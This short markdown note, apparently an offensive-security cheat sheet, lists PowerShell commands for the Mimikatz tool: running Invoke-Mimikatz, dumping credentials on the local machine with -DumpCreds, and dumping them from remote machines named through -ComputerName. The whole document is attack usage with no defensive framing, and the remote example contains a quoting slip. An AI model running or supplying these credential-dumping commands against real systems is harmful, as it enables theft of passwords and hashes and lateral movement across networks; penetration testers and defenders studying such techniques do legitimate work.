# Using Mimikatz.ps1

```
Invoke-Mimikatz

//local machine
Invoke-Mimikatz -DumpCreds

//Remote Machine
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1,"sys2")
```
